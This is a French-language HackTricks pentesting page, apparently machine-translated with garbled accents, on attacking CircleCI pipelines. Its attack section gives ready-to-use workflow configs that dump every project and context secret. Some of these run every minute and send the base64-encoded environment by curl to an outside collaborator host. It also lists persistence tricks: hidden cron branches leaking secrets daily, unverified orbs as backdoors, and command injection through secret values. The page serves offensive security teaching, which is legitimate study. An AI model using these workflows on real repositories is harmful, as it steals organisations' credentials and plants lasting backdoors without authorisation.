# S√©curit√© de CircleCI

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) est une plateforme d'int√©gration continue o√π vous pouvez **d√©finir des mod√®les** indiquant ce que vous voulez qu'il fasse avec un peu de code et quand le faire. De cette mani√®re, vous pouvez **automatiser les tests** ou les **d√©ploiements** directement **√† partir de la branche principale de votre d√©p√¥t**, par exemple.

## Autorisations

**CircleCI** **h√©rite des autorisations** de github et bitbucket li√©es au **compte** qui se connecte.\
Dans mes tests, j'ai v√©rifi√© que tant que vous avez des **autorisations d'√©criture sur le d√©p√¥t dans github**, vous pourrez **g√©rer ses param√®tres de projet dans CircleCI** (d√©finir de nouvelles cl√©s ssh, obtenir des cl√©s api de projet, cr√©er de nouvelles branches avec de nouvelles configurations CircleCI...).

Cependant, vous devez √™tre un **administrateur de d√©p√¥t** pour **convertir le d√©p√¥t en un projet CircleCI**.

## Variables d'environnement et Secrets

Selon [**la documentation**](https://circleci.com/docs/2.0/env-vars/), il existe diff√©rentes fa√ßons de **charger des valeurs dans des variables d'environnement** √† l'int√©rieur d'un flux de travail.

### Variables d'environnement int√©gr√©es

Chaque conteneur ex√©cut√© par CircleCI aura toujours des [**variables d'environnement sp√©cifiques d√©finies dans la documentation**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) comme `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` ou `CIRCLE_USERNAME`.

### Texte clair

Vous pouvez les d√©clarer en clair √† l'int√©rieur d'une **commande**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de l'**environnement d'ex√©cution** :
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de l'environnement **build-job** :
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de l'**environnement d'un conteneur** :
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Secrets du Projet

Ce sont des **secrets** qui ne seront accessibles que par le **projet** (par **n'importe quelle branche**).\
Vous pouvez les voir d√©clar√©s dans _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
La fonctionnalit√© "**Importer des Variables**" permet d'**importer des variables d'autres projets** vers celui-ci.
{% endhint %}

### Secrets de Contexte

Ce sont des secrets qui sont **valables pour toute l'organisation**. Par **d√©faut, n'importe quel d√©p√¥t** pourra acc√©der √† n'importe quel secret stock√© ici :

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Cependant, notez qu'un groupe diff√©rent (au lieu de Tous les membres) peut √™tre **s√©lectionn√© pour donner acc√®s aux secrets √† des personnes sp√©cifiques uniquement**.\
C'est actuellement l'une des meilleures fa√ßons d'**accro√Ætre la s√©curit√© des secrets**, pour ne pas permettre √† tout le monde d'y acc√©der mais seulement √† certaines personnes.
{% endhint %}

## Attaques

### Recherche de Secrets en Texte Clair

Si vous avez **acc√®s au VCS** (comme github), v√©rifiez le fichier `.circleci/config.yml` de **chaque d√©p√¥t sur chaque branche** et **recherchez** d'√©ventuels **secrets en texte clair** qui y sont stock√©s.

### Variables d'Environnement Secr√®tes & √ânum√©ration de Contexte

En v√©rifiant le code, vous pouvez trouver **tous les noms de secrets** qui sont utilis√©s dans chaque fichier `.circleci/config.yml`. Vous pouvez √©galement obtenir les **noms de contexte** √† partir de ces fichiers ou les v√©rifier dans la console web : _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltration des secrets du projet

{% hint style="warning" %}
Pour **exfiltrer TOUS** les secrets du projet et du contexte, vous avez juste besoin d'avoir un acc√®s **EN √âCRITURE** √† **un seul d√©p√¥t** dans toute l'organisation github (_et votre compte doit avoir acc√®s aux contextes mais par d√©faut tout le monde peut acc√©der √† tous les contextes_).
{% endhint %}

{% hint style="danger" %}
La fonctionnalit√© "**Importer des Variables**" permet d'**importer des variables d'autres projets** vers celui-ci. Par cons√©quent, un attaquant pourrait **importer toutes les variables du projet de tous les d√©p√¥ts** puis **exfiltrer toutes ensemble**.
{% endhint %}

Tous les secrets du projet sont toujours d√©finis dans l'environnement des t√¢ches, donc en appelant env et en l'obscurcissant en base64, vous exfiltrerez les secrets dans la **console de journal web des workflows** :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Si vous **n'avez pas acc√®s √† la console web** mais que vous avez **acc√®s au d√©p√¥t** et que vous savez que CircleCI est utilis√©, vous pouvez simplement **cr√©er un flux de travail** qui est **d√©clench√© toutes les minutes** et qui **exfiltre les secrets vers une adresse externe**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Exfiltrer les secrets de contexte

Vous devez **sp√©cifier le nom du contexte** (cela exfiltrera √©galement les secrets du projet) :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Si vous **n'avez pas acc√®s √† la console web** mais que vous avez **acc√®s au d√©p√¥t** et que vous savez que CircleCI est utilis√©, vous pouvez simplement **modifier un flux de travail** qui est **d√©clench√© toutes les minutes** et qui **exfiltre les secrets vers une adresse externe**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Cr√©er simplement un nouveau fichier `.circleci/config.yml` dans un d√©p√¥t **n'est pas suffisant pour d√©clencher une construction CircleCI**. Vous devez **l'activer en tant que projet dans la console CircleCI**.
{% endhint %}

### √âvasion vers le Cloud

**CircleCI** vous donne la possibilit√© d'ex√©cuter **vos constructions sur leurs machines ou sur les v√¥tres**.\
Par d√©faut, leurs machines sont situ√©es dans GCP, et au d√©part, vous ne pourrez pas trouver quelque chose de pertinent. Cependant, si une victime ex√©cute les t√¢ches dans **ses propres machines (potentiellement, dans un environnement cloud)**, vous pourriez trouver un **point de terminaison de m√©tadonn√©es cloud avec des informations int√©ressantes**.

Remarquez que dans les exemples pr√©c√©dents, tout a √©t√© lanc√© √† l'int√©rieur d'un conteneur Docker, mais vous pouvez √©galement **demander le lancement d'une machine virtuelle** (qui peut avoir des autorisations cloud diff√©rentes) :
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ou m√™me un conteneur Docker avec acc√®s √† un service Docker distant :
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistance

* Il est possible de **cr√©er des jetons d'utilisateur dans CircleCI** pour acc√©der aux points d'API avec les autorisations des utilisateurs.
* _https://app.circleci.com/settings/user/tokens_
* Il est possible de **cr√©er des jetons de projet** pour acc√©der au projet avec les autorisations donn√©es au jeton.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Il est possible d'**ajouter des cl√©s SSH** aux projets.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Il est possible de **cr√©er une t√¢che cron dans une branche cach√©e** dans un projet inattendu qui **fuit** toutes les variables d'environnement de contexte chaque jour.
* Ou m√™me cr√©er dans une branche / modifier une t√¢che connue qui **fuit** tous les contextes et les **secrets des projets** chaque jour.
* Si vous √™tes propri√©taire de Github, vous pouvez **autoriser les orbes non v√©rifi√©s** et en configurer un dans une t√¢che comme **porte d√©rob√©e**
* Vous pouvez trouver une **vuln√©rabilit√© d'injection de commande** dans certaines t√¢ches et **injecter des commandes** via un **secret** en modifiant sa valeur.
